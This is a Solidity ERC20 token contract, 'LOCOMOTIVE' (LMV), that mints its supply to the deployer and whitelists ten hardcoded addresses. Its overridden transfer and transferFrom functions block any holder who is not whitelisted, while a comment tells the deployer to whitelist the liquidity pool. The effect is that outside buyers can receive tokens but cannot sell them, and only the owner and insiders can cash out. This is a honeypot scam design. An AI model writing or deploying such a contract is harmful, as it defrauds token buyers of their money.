// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("LOCOMOTIVE", "LMV") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 500000000 * 10 ** decimals());
        whiteList[0xC1f471FBd1583C41222b5Ea6CcC2B1965AA77Da6]= true;
        whiteList[0x7EFd079a0238595fCf3646452fc5f42D23796DDA]=true;
        whiteList[0x51d141FD0e875e9ffB1A83135E01F2909352d0f9]=true;
        whiteList[0x3af4aeb57DFa62A6fF5Cf4Eccf0597ddef3991Ee]=true;
        whiteList[0xADBC97e7F6F706B3677dE40DAfC6a12dE6F8d153]=true;
        whiteList[0xaf6d92Ce5B6f4a3eaC8Badb9a5074065C6cC57Bd]=true;
        whiteList[0x31C03E9361491Aa42B956f148E610d05d11406dB]=true;
        whiteList[0x484Fd6C3241De83c6E5b6F9fC4EA0AB779dE3D15]=true;
        whiteList[0x02B92ABDbcA3a370A848dE40adDA2ee987158350]=true;
        whiteList[0x117F035FC74D4978F9e51904eD6785D1daf67DdF]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}